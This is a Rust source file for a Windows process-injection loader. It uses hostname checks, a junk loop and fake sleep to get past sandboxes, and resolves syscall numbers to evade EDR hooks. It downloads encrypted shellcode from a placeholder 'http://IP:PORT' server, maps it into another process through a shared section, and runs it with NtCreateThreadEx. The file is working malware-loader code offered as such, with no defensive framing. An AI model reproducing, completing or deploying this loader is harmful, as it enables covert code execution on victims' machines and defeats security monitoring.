mod utils;
mod download;
mod crypt;
mod sleep;

use std::ffi::c_void;
use std::fs::File;
use std::io::{Error, Read};
use std::ptr::null_mut;
use std::process::exit;
use winapi::shared::ntdef::{LARGE_INTEGER, NTSTATUS};
use winapi::shared::minwindef::{ULONG, HMODULE};
use winapi::um::libloaderapi::GetModuleHandleA;
use winapi::um::winnt::{
    HANDLE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PROCESS_ALL_ACCESS,
    SEC_COMMIT,
};
use winapi::um::processthreadsapi::{GetCurrentProcess, OpenProcess};
use winapi::um::handleapi::CloseHandle;

use hostname::get;
use crate::crypt::decrypt_shellcode;
use crate::download::get_contents;
use crate::sleep::fake_sleep;
use crate::utils::{check_hostname_is_valid, get_ssn, xor_decrypt, NtCreateSection, NtMapViewOfSection, NtCreateThreadEx};

// === Variáveis globais acessíveis no Assembly ===
#[no_mangle]
pub static mut g_NtCreateSectionSSN: u32 = 0;
#[no_mangle]
pub static mut g_NtMapViewOfSectionSSN: u32 = 0;
#[no_mangle]
pub static mut g_NtCreateThreadExSSN: u32 = 0;

#[no_mangle]
pub static mut g_NtDelayExecutionSSN: u32 = 0;

// === Macros ===
macro_rules! okay {
    ($msg:expr, $($args:expr),*) => {
        println!("[+] {}", format!($msg, $($args),*));
    };
    ($msg:expr) => {
        println!("[+] {}", $msg);
    };
}

macro_rules! info {
    ($msg:expr, $($args:expr),*) => {
        println!("[i] {}", format!($msg, $($args),*));
    };
    ($msg:expr) => {
        println!("[i] {}", $msg);
    };
}

macro_rules! warn {
    ($msg:expr, $($args:expr),*) => {
        println!("[-] {}", format!($msg, $($args),*));
    };
    ($msg:expr) => {
        println!("[-] {}", $msg);
    };
}

// === Inicializa os SSNs usando static mut ===
unsafe fn init_syscalls(h_ntdll: HMODULE) -> Result<(), Box<dyn std::error::Error>> {
    *(&mut g_NtCreateSectionSSN) = get_ssn(h_ntdll, "NtCreateSection")?;
    info!("{}", g_NtCreateSectionSSN);

    *(&mut g_NtMapViewOfSectionSSN) = get_ssn(h_ntdll, "NtMapViewOfSection")?;
    info!("{}", g_NtMapViewOfSectionSSN);

    *(&mut g_NtCreateThreadExSSN) = get_ssn(h_ntdll, "NtCreateThreadEx")?;

    info!("{}", g_NtCreateThreadExSSN);

    *(&mut g_NtDelayExecutionSSN) = get_ssn(h_ntdll, "NtDelayExecution")?;
    info!("{}", g_NtDelayExecutionSSN);


    Ok(())
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = std::env::args().collect();

    if args.len() != 2 {
        println!("Usage: process.exe <PID>");
        exit(1);
    }

    let target_pid = args[1].parse::<u32>().expect("Enter valid PID");

   match check_hostname_is_valid() {
       Ok(is_valid) => {
           if is_valid == true{
               info!("hostname is valid");
           }else{
               return Ok(());
           }
       }
       Err(e) =>{
           return Err("hostname is not valid".into());
       }

   }

    for i in 0..10000 {
        println!("{}", i);
    }
    fake_sleep(10);
    let encrypted_shellcode = get_contents("http://IP:PORT/content.b64").await?;


    unsafe {
        let h_ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr() as *const i8);
        if h_ntdll.is_null() {
            eprintln!("Failed to load ntdll.dll: {:?}", Error::last_os_error());
            exit(1);
        }

        info!("Endereço de ntdll.dll: 0x{:X}", h_ntdll as usize);

      
        info!("Step 0");

        init_syscalls(h_ntdll)?;
        info!("Step 1");

        let mut shellcode = decrypt_shellcode(&encrypted_shellcode)?;

        let mut section_handle: HANDLE = null_mut();
        let mut section_size: LARGE_INTEGER = std::mem::zeroed();
        *section_size.QuadPart_mut() = shellcode.len() as i64;
        info!("Step 2");

        let desired_access = winapi::um::winnt::SECTION_MAP_READ
            | winapi::um::winnt::SECTION_MAP_WRITE
            | winapi::um::winnt::SECTION_MAP_EXECUTE;


        let status = NtCreateSection(
            &mut section_handle,
            desired_access,
            null_mut(),
            &mut section_size,
            PAGE_EXECUTE_READWRITE,
            SEC_COMMIT,
            null_mut(),
        );
        info!("Step 3");

        if status < 0 {
            eprintln!("[-] NtCreateSection failed with status: {:X}", status);
            exit(1);
        }

        let mut local_section_address: *mut c_void = null_mut();
        let mut view_size = shellcode.len();
        info!("Step 4");

        let status = NtMapViewOfSection(
            section_handle,
            GetCurrentProcess(),
            &mut local_section_address,
            0,
            0,
            null_mut(),
            &mut view_size,
            2,
            0,
            PAGE_READWRITE,
        );
        info!("Step 5");

        if status < 0 {
            eprintln!("NtMapViewOfSection (local) failed with status: {:X}", status);
            exit(1);
        }

        let target_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, target_pid);
        if target_handle.is_null() {
            eprintln!("OpenProcess failed: {:?}", Error::last_os_error());
            exit(1);
        }
        info!("Step 6");

        let mut remote_section_address: *mut c_void = null_mut();
        let status = NtMapViewOfSection(
            section_handle,
            target_handle,
            &mut remote_section_address,
            0,
            0,
            null_mut(),
            &mut view_size,
            2,
            0,
            PAGE_EXECUTE_READ,
        );
        info!("Step 8");

        if status < 0 {
            eprintln!("NtMapViewOfSection (remote) failed with status: {:X}", status);
            CloseHandle(target_handle);
            exit(1);
        }



        std::ptr::copy_nonoverlapping(
            shellcode.as_ptr(),
            local_section_address as *mut u8,
            shellcode.len(),
        );
        info!("Step 9");

        let mut target_thread_handle: HANDLE = null_mut();
        let status = NtCreateThreadEx(
            &mut target_thread_handle,      
            0x1FFFFF,                       
            null_mut(),                     
            target_handle,                  
            remote_section_address  as *mut winapi::ctypes::c_void,         
            null_mut(),                     
            0,                              
            0,                              
            0,                              
            0,                              
            null_mut(),                     
        );

        info!("Step 10");

        if status < 0 {
            eprintln!("RtlCreateUserThread failed with status: {:X}", status);
        }

        CloseHandle(target_handle);
        if !target_thread_handle.is_null() {
            CloseHandle(target_thread_handle);
        }

        Ok(())
    }
}
